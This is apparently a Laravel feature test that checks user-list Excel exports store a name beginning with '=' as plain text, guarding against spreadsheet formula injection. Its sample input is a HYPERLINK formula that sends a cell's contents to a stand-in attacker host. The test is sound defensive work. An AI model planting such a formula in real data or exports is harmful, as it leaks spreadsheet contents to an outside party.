<?php

namespace Tests\Feature\Security;

use App\Domain\Users\Exports\UsersExport;
use App\Models\Tenant;
use App\Models\User;
use Database\Seeders\RoleSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Maatwebsite\Excel\Excel as ExcelWriter;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

/**
 * Anything a data-entry account can type ends up in the lists' Excel exports. PhpSpreadsheet's default binder turns a
 * string that starts with "=" into a live formula, so a user called `=HYPERLINK(...)` would run in the spreadsheet of
 * whoever exports the list.
 */
class ExcelFormulaInjectionTest extends TestCase
{
    use RefreshDatabase;

    public function test_text_starting_with_equals_is_written_as_text_not_as_a_formula(): void
    {
        $this->seed(RoleSeeder::class);
        app()->instance('tenant', Tenant::create(['name' => 'GCM', 'slug' => 'gcm', 'status' => 'active']));

        $formula = '=HYPERLINK("https://evil.example/?"&A1,"click here")';
        $user = User::factory()->create(['name' => $formula]);
        $user->assignRole('auditor');

        $path = tempnam(sys_get_temp_dir(), 'xlsx');
        file_put_contents($path, Excel::raw(new UsersExport(collect([$user->load('roles')])), ExcelWriter::XLSX));

        try {
            $sheet = IOFactory::load($path)->getActiveSheet();
            $found = false;

            foreach ($sheet->getRowIterator() as $row) {
                foreach ($row->getCellIterator() as $cell) {
                    $this->assertNotSame(DataType::TYPE_FORMULA, $cell->getDataType(), "{$cell->getCoordinate()} became a formula");

                    if ($cell->getValue() === $formula) {
                        $found = true;
                        $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
                    }
                }
            }

            $this->assertTrue($found, 'the name should be in the sheet as plain text');
        } finally {
            @unlink($path);
        }
    }
}
